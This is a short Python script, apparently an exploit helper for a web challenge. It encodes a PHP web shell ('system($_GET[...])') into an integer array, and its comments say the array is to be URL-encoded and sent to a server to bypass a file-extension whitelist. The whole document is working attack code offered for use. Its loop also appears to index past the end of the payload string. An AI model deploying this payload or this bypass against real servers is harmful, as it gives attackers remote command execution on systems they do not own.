#Urlencode the array printed by it and send it to the server
#Bypass the exntension whitelist by sending more than 50 chars

arr = [0 for X in range(4096)]

strn = "<?php system($_GET['hax']); ?>"

cnt = 0
strncnt = 0
while strncnt < len(strn):
	cnt += 2
	arr[cnt] = ord(strn[strncnt])
	cnt -= 1
	strncnt += 1
	arr[cnt] = ord(strn[strncnt])
	cnt -= 1
	strncnt += 1
	arr[cnt] = ord(strn[strncnt])
	strncnt += 1
	cnt += 4

print arr
